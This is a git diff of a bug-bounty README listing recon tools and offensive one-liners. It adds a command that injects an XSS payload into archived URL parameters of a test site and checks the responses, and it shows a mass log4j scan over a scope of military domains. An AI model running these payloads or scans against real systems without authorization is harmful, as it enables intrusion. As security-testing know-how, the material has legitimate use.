@@ -2,11 +2,6 @@
 
 Our main goal is to share tips from some well-known bughunters. Using recon methodology, we are able to find subdomains, apis, and tokens that are already exploitable, so we can report them. We wish to influence Onelinetips and explain the commands, for the better understanding of new hunters.. 👑
 
-
-## TREINAMENTO NOVO COM VAGAS ABERTAS 10% DE DESCONTO = DESCONTODE10
-
-[![HOTMART](https://2handsart.com/wp-content/uploads/2021/02/hm.png)](https://www.ofjaaah.com.br/automacaorecon)
-
 ## Stats King
 
 ![OFJAAAH](https://github-readme-stats.vercel.app/api?username=KingOfBugbounty&show_icons=true&theme=dracula)
@@ -62,12 +57,15 @@ To run the project, you will need to install the following programs:
 - [Filter-resolved](https://github.com/tomnomnom/hacks/tree/master/filter-resolved)
 - [Findomain](https://github.com/Edu4rdSHL/findomain)
 - [Fuff](https://github.com/ffuf/ffuf)
+- [Freq](https://github.com/takshal/freq)
 - [Gargs](https://github.com/brentp/gargs)
 - [Gau](https://github.com/lc/gau)
 - [Gf](https://github.com/tomnomnom/gf)
 - [Github-Search](https://github.com/gwen001/github-search)
 - [Gospider](https://github.com/jaeles-project/gospider)
 - [Gowitness](https://github.com/sensepost/gowitness)
+- [Goop](https://github.com/deletescape/goop)
+- [GetJS](https://github.com/003random/getJS)
 - [Hakrawler](https://github.com/hakluke/hakrawler)
 - [HakrevDNS](https://github.com/hakluke/hakrevdns)
 - [Haktldextract](https://github.com/hakluke/haktldextract)
@@ -82,6 +80,7 @@ To run the project, you will need to install the following programs:
 - [Metabigor](https://github.com/j3ssie/metabigor)
 - [MassDNS](https://github.com/blechschmidt/massdns)
 - [Naabu](https://github.com/projectdiscovery/naabu)
+- [Notify](https://github.com/projectdiscovery/notify)
 - [Qsreplace](https://github.com/tomnomnom/qsreplace)
 - [Rush](https://github.com/shenwei356/rush)
 - [SecretFinder](https://github.com/m4ll0k/SecretFinder)
@@ -91,14 +90,12 @@ To run the project, you will need to install the following programs:
 - [Subfinder](https://github.com/projectdiscovery/subfinder)
 - [SubJS](https://github.com/lc/subjs)
 - [Unew](https://github.com/dwisiswant0/unew)
+- [Unfurl](https://github.com/tomnomnom/unfurl)
 - [WaybackURLs](https://github.com/tomnomnom/waybackurls)
 - [Wingman](https://xsswingman.com/#faq)
-- [Notify](https://github.com/projectdiscovery/notify)
 - [Goop](https://github.com/deletescape/goop)
 - [Tojson](https://github.com/tomnomnom/hacks/tree/master/tojson)
-- [GetJS](https://github.com/003random/getJS)
 - [X8](https://github.com/Sh1Yo/x8)
-- [Unfurl](https://github.com/tomnomnom/unfurl)
 - [XSStrike](https://github.com/s0md3v/XSStrike)
 - [Page-fetch](https://github.com/detectify/page-fetch)
 
@@ -113,6 +110,12 @@ bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa
 - [Explained command](https://bit.ly/3IUivk9)
 ```bash
 bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"'
+```
+
+###  FREQ XSS 
+- [Explained command](https://bit.ly/3u8Qpeu)
+```bash
+echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
 ```
 
 
